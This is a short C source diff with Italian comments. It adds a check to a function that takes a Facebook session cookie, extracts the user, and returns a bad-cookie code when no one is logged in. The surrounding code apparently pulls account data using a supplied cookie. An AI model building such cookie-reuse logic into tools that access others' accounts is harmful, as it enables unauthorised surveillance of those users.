@@ -124,6 +124,10 @@ DWORD HandleFaceBook(char *cookie)
 	sprintf_s(user, "%s", parser1);
 	SAFE_FREE(r_buffer);
 
+	// Torna utente "0" se non siamo loggati
+	if (!strcmp(user, "0"))
+		return SOCIAL_REQUEST_BAD_COOKIE;
+
 	// Carica dal file il last time stamp per questo utente
 	last_tstamp = GetLastFBTstamp(user);
 	if (last_tstamp == FB_INVALID_TSTAMP)
